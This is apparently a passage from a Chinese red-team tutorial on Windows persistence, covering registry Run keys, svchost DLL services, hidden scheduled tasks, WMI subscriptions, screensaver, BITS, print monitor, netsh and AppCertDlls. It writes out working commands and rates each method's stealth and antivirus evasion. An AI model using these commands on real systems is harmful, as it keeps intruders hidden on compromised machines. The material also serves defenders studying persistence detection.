<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\Setup</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce\Setup</span><br><span class="line"></span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Setup /t REG_SZ /d "[Absolute <span class="built_in">Path</span>]\evil.exe" /f</span><br></pre></td></tr></table></figure>

<p>7.RunOnce注册键</p>
<p>安装程序通常用RunOnce键自动运行程序</p>
<p>HKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；</p>
<p>HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">[小于NT6]</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line"></span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v evil /t REG_SZ /d "[Absolute <span class="built_in">Path</span>]\evil.exe" /f</span><br></pre></td></tr></table></figure>

<p>8.Run注册键</p>
<p>Run是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"></span><br><span class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"</span> /v evil /t REG_SZ /d <span class="string">"[Absolute Path]\evil.exe"</span> /f</span><br></pre></td></tr></table></figure>



<p>写入注册键命令如下：</p>
<p><code>reg add &quot;XXXX&quot; /v evil /t REG_SZ /d &quot;[Absolute Path]\evil.exe&quot; /f</code></p>
<h4><span id="服务">服务</span></h4><p>权限要求：未降权的管理员权限。</p>
<p>创建服务是需要非降权管理员权限的，因此拿到shell后要用这种方法做维持首先要提权，但其优点是隐蔽性比注册键高（如用svchost的服务组加载DLL就可以隐藏掉恶意进程）。CMD和Powershell都可以用命令添加服务，样例如下：</p>
<p><code>sc create evil binpath= &quot;cmd.exe /k [Absolute Path]evil.exe&quot; start= &quot;auto&quot; obj= &quot;LocalSystem&quot;</code></p>
<p>这种直接通过cmd拉起的服务创建起来很简单。这里需要注意一个小坑：shellcodeloader主线程会阻塞导致服务启动时认为程序无响应而失败，因此必须用cmd拉起来，不能直接创建服务。服务正常启动后进程以SYSTEM权限在用户登录前运行。但缺点也很明显，恶意进程还是独立存在的，隐蔽性较差。如下图：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15940895216157.jpg" alt="15940895216157"><br>还有一类服务是通过svchost启动，由于Windows系统中的许多服务都是通过注入到该程序中启动（这也是官方认可的DLL注入动作），因此只要DLL本身免杀，杀毒软件就不会理会这种行为，并且由于恶意进程并不是独立存在的，隐蔽性相对较高。<br>但使用svchost加载服务就不是一行命令可以完成的，不仅需要自己做一个服务DLL，还需要额外在注册表中添加一些东西。由于64位系统有两套注册表和两套svchost，因此命令还有微小的不同。<br>32位系统命令如下：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sc create TimeSync binPath= "C:\Windows\System32\svchost.exe -k netsvr" <span class="built_in">start</span>= auto obj= LocalSystem</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters /v ServiceDll /t REG_EXPAND_SZ /d "C:\Users\hunter\Desktop\localService32.dll" /f /reg:<span class="number">32</span></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v Description /t REG_SZ /d "Windows <span class="built_in">Time</span> Synchronization Service" /f /reg:<span class="number">32</span></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v DisplayName /t REG_SZ /d "TimeSyncSrv" /f /reg:<span class="number">32</span></span><br><span class="line">reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvr /t REG_MULTI_SZ /d TimeSync /f /reg:<span class="number">32</span></span><br><span class="line">sc <span class="built_in">start</span> TimeSync</span><br></pre></td></tr></table></figure>

<p>64位系统中注册32位服务命令如下：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sc create TimeSync binPath= "C:\Windows\Syswow64\svchost.exe -k netsvr" <span class="built_in">start</span>= auto obj= LocalSystem</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters /v ServiceDll /t REG_EXPAND_SZ /d "C:\Users\hunter\Desktop\localService32.dll" /f /reg:<span class="number">32</span></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v Description /t REG_SZ /d "Windows <span class="built_in">Time</span> Synchronization Service" /f /reg:<span class="number">32</span></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v DisplayName /t REG_SZ /d "TimeSyncSrv" /f /reg:<span class="number">32</span></span><br><span class="line">reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvr /t REG_MULTI_SZ /d TimeSync /f /reg:<span class="number">32</span></span><br><span class="line">sc <span class="built_in">start</span> TimeSync</span><br></pre></td></tr></table></figure>

<p>64位系统命令如下：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sc create TimeSync binPath= "C:\Windows\System32\svchost.exe -k netsvr" <span class="built_in">start</span>= auto obj= LocalSystem</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters /v ServiceDll /t REG_EXPAND_SZ /d "C:\Users\hunter\Desktop\localService32.dll" /f /reg:<span class="number">64</span></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v Description /t REG_SZ /d "Windows <span class="built_in">Time</span> Synchronization Service" /f /reg:<span class="number">64</span></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v DisplayName /t REG_SZ /d "TimeSyncSrv" /f /reg:<span class="number">64</span></span><br><span class="line">reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvr /t REG_MULTI_SZ /d TimeSync /f /reg:<span class="number">64</span></span><br><span class="line">sc <span class="built_in">start</span> TimeSync</span><br></pre></td></tr></table></figure>

<p>注意这里有个大坑，使用“reg add”命令向注册表键中添加数据的时候是直接覆盖的，而“HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost”中的大多数的键都是REG_MULTI_SZ类型，即多行数据。因此千万不能直向已经存在的键中写入数据，系统启动所需要的服务都在里面，覆盖后会出大问题！（所以上面命令中是用的“netsvr”，这个键默认是不存在的）</p>
<p>或者先读取再追加的方式,通过读取可以发现多行是通过\0分开的</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvcs</span><br><span class="line"> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvr /t REG_MULTI_SZ /d "CertPropSvc\<span class="number">0</span>SCPolicySvc\<span class="number">0</span>TimeSync" /f /reg:<span class="number">64</span></span><br></pre></td></tr></table></figure>



<h4><span id="计划任务">计划任务</span></h4><p>权限要求：未降权的管理员权限/普通用户。</p>
<p>计划任务也是一项很好的持久化利用点。不同于自启注册键和服务项，计划任务的设定方式更多样、灵活，位置也相对较为隐蔽（手工排查要多点几下）。比如，有一阵子碰到闹得很凶的“驱动人生”挖矿木马其中的一个持久化方式就是在定时任务中创建了很多powershell脚本来做的持久化，它的stager直接以base64编码的方式写在计划任务的命令行参数中。那个输入框很短，对没有经验的工程师来说后面的内容就很容易没有看到而忽略掉。</p>
<p>Windows中有命令“SCHTASKS”用来管理计划任务，支持下面几个选项：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">SCHTASKS /parameter [arguments]</span><br><span class="line"></span><br><span class="line">描述:</span><br><span class="line">    允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任</span><br><span class="line">    务。</span><br><span class="line"></span><br><span class="line">参数列表:</span><br><span class="line">    /Create         创建新计划任务。</span><br><span class="line"></span><br><span class="line">    /Delete         删除计划任务。</span><br><span class="line"></span><br><span class="line">    /Query          显示所有计划任务。</span><br><span class="line"></span><br><span class="line">    /Change         更改计划任务属性。</span><br><span class="line"></span><br><span class="line">    /Run            按需运行计划任务。</span><br><span class="line"></span><br><span class="line">    /End            中止当前正在运行的计划任务。</span><br><span class="line"></span><br><span class="line">    /ShowSid        显示与计划的任务名称相应的安全标识符。</span><br><span class="line"></span><br><span class="line">    /?              显示此帮助消息。</span><br></pre></td></tr></table></figure>



<p>“计划任务程序库”中也是有路径的，Windows初始状态在根目录中是没有计划任务的，如下图：<br><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941759248151.jpg" alt><br>当然子目录中也是没有计划任务的：<br><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941759590158.jpg" alt><br><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941759757751.jpg" alt><br>计划任务都被放在了最内层目录里面，因此为了确保隐蔽性，我们也可以遵守Windows默认的规范在“\Microsoft\Windows\”下面新建我们的子目录和计划任务。示例命令如下：<br><code>SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\evil\eviltask /TR C:\Users\hunter\Desktop\evil.exe</code><br>无需登录即可收到beacon：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941782308073.jpg" alt="-w1255"></p>
<p>在进程树中，恶意进程是被taskeng.exe即任务计划程序引擎拉起的，隐蔽性弱于DLL服务，但强于自启注册键。<br>但是，大坑又来了，我们发现SCHTASKS命令功能并不完整，很多配置项是无法操作的，比如不支持同时创建多个触发器，不支持修改“条件”和“设置”选项卡中的功能。如下：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941803601802.jpg" alt></p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941803719088.jpg" alt></p>
<p>这些选项都是任务创建时的默认状态，也就是说我们的计划任务不会在睡眠唤醒时启动，断开交流电源自动停止，超过3天自动停止。而这些高级选项却不支持用命令行配置，查了一下微软社区，官方给的回复竟然是这样的：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941805965354.jpg" alt></p>
<p>哭笑不得…对于正常用户使用起来确实没问题，但对于红队来说，我们不方便操作GUI啊！当然也可以通过制作DLL模块或exe直接调用WINAPI来操作，但那还需要额外再上传一个文件，效率稍低。因此计划任务这个持久化的路子只能作为一个保险，并不能完全依赖。<br>此外还有一个有些相似的利用点——组策略。在启动脚本处可以执行cmd脚本或ps脚本从而执行任意命令，但由于命令行版本的组策略编辑器功能太过受限，就不再做展开（如果可以登录桌面的话直接去gpedit.msc去配置启动脚本即可持久化，且隐蔽性较高）。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 开机自启动</span><br><span class="line">SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\evil\eviltask /TR C:\Users\hunter\Desktop\evil.exe</span><br><span class="line"># 每分钟执行一次notepad,存在实例不会重复运行，如果被关闭则会在运行一个新的实例</span><br><span class="line">schtasks /create /tn WindowsUpdate /tr notepad.exe /sc minute /mo <span class="number">1</span></span><br><span class="line"># 停止计划任务</span><br><span class="line">schtasks /End /TN WindowsUpdate</span><br><span class="line"># 启动计划任务</span><br><span class="line">schtasks /Run /TN WindowsUpadte</span><br><span class="line"># 查询计划任务：</span><br><span class="line"><span class="built_in">chcp</span> <span class="number">437</span> &amp;&amp; schtasks /Query /TN WindowsUpdate （win7以上支持/TN）</span><br><span class="line"># system权限运行：</span><br><span class="line">/RU SYSTEM</span><br></pre></td></tr></table></figure>



<h4><span id="wmi">WMI</span></h4><p>权限要求：未降权的管理员权限。<br>我们可以认为WMI是一组可以直接与Windows操作系统交互的API，由于这是操作系统自带的工具，无需安装，因此也是权限维持的好帮手。<br>由于WMI的事件会循环执行，为确保不会无限弹shell，可以使用系统启动时间来限制（只要触发延时可以落在限定区间即可，有些机器启动慢因此起始时间调高些）。示例命令如下：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /NAMESPACE:"\\root\subscription" <span class="built_in">PATH</span> __EventFilter CREATE Name="evil", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN <span class="number">60</span> WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= <span class="number">240</span> AND TargetInstance.SystemUpTime &lt; <span class="number">310</span>"</span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:"\\root\subscription" <span class="built_in">PATH</span> CommandLineEventConsumer CREATE Name="evilConsumer", ExecutablePath="C:\Users\hunter\Desktop\beacon.exe",CommandLineTemplate="C:\Users\hunter\Desktop\beacon.exe"</span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:"\\root\subscription" <span class="built_in">PATH</span> __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"evil\"", Consumer="CommandLineEventConsumer.Name=\"evilConsumer\""</span><br></pre></td></tr></table></figure>

<p>由于时间区间的落点不一定相同，特定情况下有可能会出现多个beacon：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942611474268.jpg" alt></p>
<p>看下进程树，隐蔽性一般：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942611901937.jpg" alt="-w733"></p>
<h4><span id="屏幕保护">屏幕保护</span></h4><p>要求：普通用户。<br>虽然未必所有用户都会使用屏幕保护，但幸运的是屏幕保护程序的相关配置都在注册表中，如下图的四个键：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941951175848-1609917502394.jpg" alt></p>
<p>完整路径如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE</span><br></pre></td></tr></table></figure>

<p>直接写入注册表即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;hkcu\control panel\desktop&quot; &#x2F;v SCRNSAVE.EXE &#x2F;d C:\Users\hunter\Desktop\beacon.exe &#x2F;f</span><br><span class="line">reg add &quot;hkcu\control panel\desktop&quot; &#x2F;v ScreenSaveActive &#x2F;d 1 &#x2F;f</span><br><span class="line">reg add &quot;hkcu\control panel\desktop&quot; &#x2F;v ScreenSaverIsSecure &#x2F;d 0 &#x2F;f</span><br><span class="line">reg add &quot;hkcu\control panel\desktop&quot; &#x2F;v ScreenSaveTimeOut &#x2F;d 60 &#x2F;f</span><br></pre></td></tr></table></figure>

<p>看一下进程树，winlogon.exe拉起来的，隐蔽性一般：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942000886914-1609917502394.jpg" alt></p>
<p>这里又有个小坑，如果从未设置过屏保程序的话，除“ScreenSaveActive”默认值为1，其他键都是不存在的，而屏保程序的正常运行必须保证这几个键都有数据才可以，因此必须把4个键都重写一遍。另外，经测试屏保程序最短触发时间为60秒，即使改成小于60的数值，依然还是60秒后执行程序。</p>
<p>当然，从注册表路径也可以看出这种方式只能获得当前用户权限的shell，优点是不需要提权即可维持</p>
<h4><span id="后台智能传输服务bits">后台智能传输服务（BITS）</span></h4><p>权限要求：管理员权限（不必过UAC）。</p>
<p>后台智能传送服务 (BITS) 可帮助传输大量数据而不会降低网络性能。它通过在小区块中传输数据、充分利用可用的但未使用的带宽和在目的地重组数据的方式来实现此操作。在 Microsoft® Windows Server 2003 家族操作系统上和 Microsoft® Windows 2000 上都支持 BITS。——摘自百度百科</p>
<p>网上的“渗透教程”中有很多利用bitsadmin命令下载文件或执行命令的操作，但它其实也可以用来做权限维持，并且可以绕过Autoruns的检测以及杀软的自启命令执行保护。</p>
<p>添加任务的命令很简单，只有4条：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;create evil</span><br><span class="line">bitsadmin &#x2F;addfile evil &quot;C:\Users\hunter\Desktop\beacon.exe&quot; &quot;C:\Users\hunter\Desktop\beacon.exe&quot;</span><br><span class="line">bitsadmin.exe &#x2F;SetNotifyCmdLine evil &quot;C:\Users\hunter\Desktop\beacon.exe&quot; NUL</span><br><span class="line">bitsadmin &#x2F;Resume evil</span><br></pre></td></tr></table></figure>

<p>其有个优点是可以在降权的管理员回话中执行（不过UAC），当然得到的beacon也是降权的：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942634946633.jpg" alt></p>
<p>重启后由于任务并未结束，依然会被系统拉起，达到了持久化的目的。虽然后台智能传输服务的任务默认时长是90天，90天后任务自动取消，但对于红队来说这已经足够了：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942636609526.jpg" alt></p>
<p>看一下进程树，是“svchost.exe -k netsvcs”拉起的。但由于是独立进程，隐蔽性一般：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942638861891.jpg" alt></p>
<p>这种方法可以绕过目前所有启动项检查工具，唯一检测方式是通过bistamin命令：<br><code>bitsadmin /list /allusers /verbose</code><br>可以看到所有任务如下（忘记截图，这是另一台测试机，数据不同）：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/11594264666_.pic.jpg" alt="11594264666_.pic"></p>
<h4><span id="后台打印程序服务还需制作dllok">后台打印程序服务（还需制作dll，ok）</span></h4><p>权限要求：未降权的管理员权限。<br>后台打印程序服务负责管理Windows操作系统中的打印作业，由于很多用户还是要使用打印机的，所以优化软件也不会推荐禁用这个服务。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc query Spooler</span><br></pre></td></tr></table></figure>

<p>打印后台处理程序的API包含一个函数-AddMonitor，用于安装本地端口监视器并连接配置、数据和监视器文件。该函数会将DLL注入到spoolsv.exe进程以实现相应功能。系统初始状态下需要调用的DLL如下：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942829919642.jpg" alt="-w316"></p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942829754223.jpg" alt="-w333"></p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942830068138.jpg" alt="-w327"></p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942830168238.jpg" alt="-w338"></p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942830257499.jpg" alt="-w333"></p>
<p>这些DLL都是包含与打印服务驱动相关的内容，那么我们也可以利用这个机制驻留一个恶意DLL，当然，和注册服务一样，这必须要未降权的管理员权限。<br>首先将恶意DLL放到C:\Windows\System32\路径下：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942832874448.jpg" alt="-w447"></p>
<p>然后执行命令添加相关注册表项和Driver键：<br><code>reg add &quot;hklm\system\currentcontrolset\control\print\monitors\monitor&quot; /v &quot;Driver&quot; /d &quot;monitor.dll&quot; /t REG_SZ</code></p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942833465941.jpg" alt="-w572"></p>
<p>重新启动后，恶意DLL则会被自动加载到spoolsv.exe，隐蔽性较强：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942834095268.jpg" alt="-w641"></p>
<p>控制端以SYSTEM权限上线（这里演示暂时用的MSF，CS的DLL还要自己重写一个）：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942834398848.jpg" alt="-w876"></p>
<h5><span id="制作">制作</span></h5><p>1、dllmain里不要写任意代码了</p>
<p>2、编写导出函数<code>InitializePrintMonitor2</code>，恶意代码可以写入该导出函数内</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210130101038648.png" alt="image-20210130101038648"></p>
<p>go里的写法</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210130101055410.png" alt="image-20210130101055410"></p>
<h4><span id="netsh还需制作dllok">Netsh（还需制作dll，ok）</span></h4><p>权限要求：未降权的管理员权限。</p>
<p>netsh也是Windows自带的命令，是用来配置网络的命令行工具。该工具可以通过导入helperdll的方式实现功能，且DLL导入后会写进注册表，永久有效：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</span><br></pre></td></tr></table></figure>

<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942878508692.jpg" alt="-w692"></p>
<p>因此可以通过导入helperdll的方式做权限维持，命令格式如下：</p>
<p><code>netsh add helper [Absolute evil DLL path]</code></p>
<p>但是由于netsh并不会开启自启动，因此还要再写一条自启动项：<br><code>reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Pentestlab /t REG_SZ /d &quot;cmd /c C:\Windows\System32\netsh&quot;</code></p>
<p>重新启动后依然可获得shell：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942876076891.jpg" alt="-w893"></p>
<p>进程树和加载的恶意模块如下，隐蔽性较强：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942877276687.jpg" alt="-w625"></p>
<p>但由于测试过程依然使用的是msf生成的DLL，启动netsh的时候会弹出黑框并阻塞，关掉netsh进程后连接也就断掉了，因此后续实战应用还需要自己写DLL。</p>
<p>PS: 删除dll <code>netsh delete  helper</code></p>
<h5><span id="制作">制作</span></h5><p>1、dllmain里不要写任意代码了</p>
<p>2、编写导出函数<code>InitHelperDll</code>，恶意代码可以写入该导出函数内</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210130101143617.png" alt="image-20210130101143617"></p>
<p>3、需要注意netsh运行会有黑色弹框，需要隐藏窗口</p>
<p>思路是通过遍历所有窗口句柄，根据窗口句柄获取pid，匹配pid和当前进程是否一致，一致则根据该句柄进行隐藏。（下面是用go写的，主要看API接口名称做参考）</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210130101344686.png" alt="image-20210130101344686"></p>
<h4><span id="appcertdlls需要制作dllok">AppCertDlls(需要制作dll，ok)</span></h4><p>权限要求：未降权的管理员权限。</p>
<p>众所周知注册表项“AppInit_DLLs”中的值会在user32.dll被加载到内存的时候被读取，若其中有值则调用API“LoadLibrary()”加载用户DLL。</p>
<p>早些年用这个做DLL注入式持久化比较流行，但如今在很多新系统上却失效了。其原因是由于kernel32.dll在启动时有一个标记位的判断，如下图：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15943591321052.jpg" alt></p>
<p>kernel32.dll对0x67的Class进行NtQuerySystemInformation后，检查ReturnLength与2的运算是否为0（是否相等），若相等则不加载DLL直接ret。</p>
<p>关于0x67在网上可以查到相关资料：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15943597613469.jpg" alt></p>
<p>它是由bcdedit.exe的“–set testsigning on/off”参数设置的，但现在比较新的机器一般都在BIOS中默认设置了secure boot，如果不关掉这个选项是无法修改上面的标记的。因此，这个方法目前局限性就比较大了。</p>
<p>然而其实还有一个注册表项不太常用，并且也能够自动加载DLL，那就是AppCertDlls。当进程使用了CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW、WinExec这些API的时候，该项中的内容会被自动加载，而幸运的，是很多程序都会调用这些API。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls"  /v Default /t REG_SZ /d "[Absolute Path]\evil.dll" /f</span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除</span></span><br><span class="line">reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls"  /v Default  /f</span><br></pre></td></tr></table></figure>



<p>写一个测试程序调用上面的API：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15943605770806.jpg" alt></p>
<p>执行：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15943606055705.jpg" alt></p>
<p>msf上线：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15943606748189.jpg" alt="-w878"></p>
<p>看下进程树：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15943607598833.jpg" alt></p>
<p>只是在正常进程下面开了个rundll32.exe，将恶意DLL加载，隐蔽性较高。</p>
<p>但使用msf的DLL依然只能做测试，由于系统的很多程序都会调用以上API（比如explorer.exe），而msf的DLL会导致进程阻塞，最终导致启动的时候进不去桌面，因此DLL还要之后自己写。</p>
<h5><span id="dll制作">dll制作</span></h5><p>1、dll制作需要注意导出以下函数，否则会造成进程崩溃，开机无法显示登录窗口一致卡着。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">NTSTATUS __stdcall <span class="title">CreateProcessNotify</span><span class="params">(LPCWSTR lpApplicationName, ULONG uReason)</span> </span>&#123;</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>, <span class="string">L"AppCertDll!"</span>, <span class="string">L"AppCertDll!!!"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

